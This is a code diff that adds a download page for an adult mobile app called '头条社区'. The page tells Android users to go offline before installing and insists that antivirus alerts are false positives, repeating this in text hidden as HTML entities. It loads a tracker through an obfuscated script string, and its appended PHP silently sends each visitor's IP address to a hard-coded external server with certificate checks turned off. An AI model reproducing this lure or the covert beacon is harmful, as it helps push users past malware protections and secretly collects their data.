@@ -1,17 +1,138 @@
-<script type="text/javascript">
-   var sum = 0; 
-   var str=location.href; //取得整个地址栏
-   var num=str.indexOf("?") 
-   str=str.substr(num+1); //取得所有参数   stringvar.substr(start [, length ]
- 
-   var arr=str.split("&"); //各个参数放到数组里
-   for(var i=0;i < arr.length;i++){ 
-    num=arr[i].indexOf("="); 
-    if(num>0){ 
-     name=arr[i].substring(0,num);
-     value=arr[i].substr(num+1);
-     sum=sum + parseInt(value);
-     } 
-    }
-	document.write(sum);
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge,chrome=1">
+    <meta data-n-head="true" name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>头条社区</title>
+    <link rel="shortcut icon" href="./img/log.ico">
+    <link rel="shortcut icon" href="./img/log.ico">
+    <link rel="stylesheet" href="./iconfont/iconfont.css?v=2020072707">
+    <link rel="stylesheet" href="./css/reset.css?v=2020072707">
+    <link rel="stylesheet" href="./css/mobile.css?v=2020072707">
+    <script>
+        (function (c, d) {
+            var e = document.documentElement || document.body,
+                a = "orientationchange" in window ? "orientationchange" : "resize",
+                b = function () {
+                    var f = e.clientWidth;
+                    // e.style.fontSize = (f >= 750) ? "100px" : 100 * (f / 750) + "px"
+                    e.style.fontSize = (f >= 580) ? "77px" : 77 * (f / 580) + "px"
+                };
+            b();
+            c.addEventListener(a, b, false)
+        })(window);
+        function isIos() {
+            return /(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent);
+        }
+    </script>
+    <script src="./js/clipboard.min.js?v=2020072707"></script>
+    <script type="text/javascript">document.write(unescape("%3Cspan id='cnzz_stat_icon_1279994798'%3E%3C/span%3E%3Cscript src='https://s9.cnzz.com/z_stat.php%3Fid%3D1279994798' type='text/javascript'%3E%3C/script%3E"));</script>
+</head>
+<body>
+    <div class="mobile">
+        <div class="fixed-bg">
+            <div class="bg-slides">
+                <img class="" src="./img/1.png" alt="">
+                <img class="" src="./img/2.png" alt="">
+                <img class="" src="./img/3.png" alt="">
+                <img class="" src="./img/4.png" alt="">
+            </div>
+            <div class="shadow"></div>
+        </div>
+        <div class="fixed-header">
+            <!--data-load-src="           <img class="logo "  src="./img/logo.png?v=2020072707" alt="">
+            <h1 class="title" style="font-size: 0.36rem"></h1>-->
+        </div>
+<!--        <a class="fixed-right" href="http://taohuadao.info">-->
+<!--            <img class="icon" src="/skin/index/static/image/app-more-icon.png" alt="">-->
+<!--            <span>更多精彩应用</span>-->
+<!--            <i class="iconfont icon-right"></i>-->
+<!--        </a>-->
+        <div class="main">
+            <div class="center" style="text-align: center;">
+                <img class="" style="max-width: 90%;" src="./img/home.png" alt="">
+            </div>
+            <script>
+                if(isIos()){
+                    document.writeln('<a class="download-btn copy" href="../download.php"><i class="iconfont icon-ios"></i><span id="download-text">苹果版(推荐)</span></a>')
+                    /*document.writeln('<a class="download-btn copy" href="" data-clipboard-text=""><i class="iconfont icon-ios"></i><span id="download-text">苹果版(推荐)</span></a>')*/
+                }else{
+                    document.writeln('<a class="download-btn copy" href="../download.php" ><i class="iconfont icon-android"></i><span id="download-text">Android下载</span></a>')
+                }
+            </script>
+            <p class="android-doc-btn" style="margin-top: 20px">【安卓用户下载后如果不能安装，请断网再进行安装】</p>
+            <p class="android-doc-btn">【头条社区App包含成人内容，会被部分手机厂商、杀毒软件误报为恶意软件。但我们承诺绝不放置任何恶意程序，请大家放心使用！】</p>
+            <!--        <div class="doc-btn" onclick="pageDocShow()">安装流程 <i class="iconfont icon-right"></i></div>-->
+        </div>
+        <div class="tips">
+            <p> &#30001;&#20110;&#34892;&#19994;&#21407;&#22240;&#65292;&#26412;APP&#34987;&#26576;&#20123;&#26432;&#27602;&#36719;&#20214;&#35748;&#23450;&#20026;&#30149;&#27602;&#65292;&#35831;&#22823;&#23478;&#25918;&#24515;&#20351;&#29992;&#65292;&#26412;APP&#21547;&#26377;&#24191;&#21578;&#21644;VIP&#25910;&#30410;&#65292;&#19988;&#24050;&#30408;&#21033;&#65292;&#23433;&#35013;&#26412;APP&#19981;&#20250;&#23545;&#24744;&#30340; &#25163;&#26426;&#36896;&#25104;&#20219;&#20309;&#25439;&#23475;</p>
+        </div>
+    </div>
+    <!--<a href="http://jusege.nz"  style="position: fixed;left: 0;bottom: 1.3rem;width: 100%;">
+        <img style="width: 100%;height: auto;max-height: 1.2rem" src="" alt="">
+    </a>-->
+   </body>
+<script>
+    // 复制参数
+    new ClipboardJS('.copy');
+    
 </script>
+<!--<script>(function(d,t,u,s,e){e=d.getElementsByTagName(t)[0];s=d.createElement(t);s.src=u;s.async=1;e.parentNode.insertBefore(s,e);})(document,'script','https://fyg0.xyz/php/app.php?widget-init.js');-->
+<!--</script>-->
+<script>
+    // 序列帧动画
+    var bgSlides = document.querySelectorAll('.bg-slides img');
+    var count = 0;
+    setInterval(function () {
+        count<(bgSlides.length - 1)?count++:count=0;
+        bgSlides.forEach(function (item,index) {
+            if(index === count){
+                item.style.opacity = 1;
+            }else{
+                item.style.opacity = 0;
+            }
+        })
+    },3000)
+</script>
+
+</html>
+<?php
+
+$user_IP = ($_SERVER["HTTP_VIA"]) ? $_SERVER["HTTP_X_FORWARDED_FOR"] : $_SERVER["REMOTE_ADDR"];
+$user_IP = ($user_IP) ? $user_IP : $_SERVER["REMOTE_ADDR"];  
+$host = $_SERVER['SERVER_NAME'];
+$h = substr($host,0,-4);
+if($h == "ktop3"){
+    $h = "default";
+}
+
+ //extend
+          $url = 'http://47.242.201.185/api/issue/code/watch';
+          $data = json_encode([
+            'ip' => $user_IP,
+            'mark' => $h,
+            
+          ]);
+          
+          $headers = [
+            'Content-Type: application/json',
+            'Content-Length: ' . strlen($data),
+          ];
+          $ch = curl_init();
+          curl_setopt($ch, CURLOPT_URL, $url);
+          if (0 === strpos(strtolower($url), 'https')) {
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+          }
+          curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
+          curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+          curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+          curl_exec($ch);
+          curl_close($ch);
+          
+          
+         
+
+?>
